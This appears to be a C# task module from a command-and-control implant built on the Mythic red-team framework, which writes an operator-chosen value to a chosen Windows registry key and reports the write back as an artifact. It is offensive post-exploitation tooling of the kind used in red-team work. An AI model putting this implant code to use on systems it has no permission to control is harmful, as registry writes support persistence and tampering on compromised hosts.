#define COMMAND_NAME_UPPER

#if DEBUG
#define REG_WRITE_VALUE
#endif

#if REG_WRITE_VALUE

using NotpolloInterop.Classes;
using NotpolloInterop.Interfaces;
using NotpolloInterop.Structs.MythicStructs;
using NotpolloInterop.Utils;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class reg_write_value : Tasking
    {
        [DataContract]
        internal struct RegWriteParameters
        {
            [DataMember(Name = "hive")]
            public string Hive;
            [DataMember(Name = "key")]
            public string Key;
            [DataMember(Name = "value_name")]
            public string ValueName;
            [DataMember(Name = "value_value")]
            public string ValueValue;
        }
        public reg_write_value(IAgent agent, NotpolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }

        private bool SetValue(string hive, string subkey, string valueName, object valueValue)
        {
            using (RegistryKey regKey = RegistryUtils.GetRegistryKey(hive, subkey))
            {
                regKey.SetValue(valueName, valueValue);
                return true;
            }
        }


        public override void Start()
        {
            TaskResponse resp;
            RegWriteParameters parameters = _jsonSerializer.Deserialize<RegWriteParameters>(_data.Parameters);
            bool bRet;

            if (int.TryParse(parameters.ValueValue, out int dword))
            {
                bRet = SetValue(parameters.Hive, parameters.Key, parameters.ValueName, dword);
            }
            else
            {
                bRet = SetValue(parameters.Hive, parameters.Key, parameters.ValueName, parameters.ValueValue);
            }

            if (bRet)
            {
                resp = CreateTaskResponse(
                    $"Successfully set {parameters.ValueName} to {parameters.ValueValue}",
                    true,
                    "completed",
                    new IMythicMessage[1]
                    {
                        Artifact.RegistryWrite(parameters.Hive, parameters.Key, parameters.ValueName, parameters.ValueValue)
                    });
            }
            else
            {
                resp = CreateTaskResponse(
                    $"Failed to set {parameters.ValueName}", true, "error");
            }

            // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif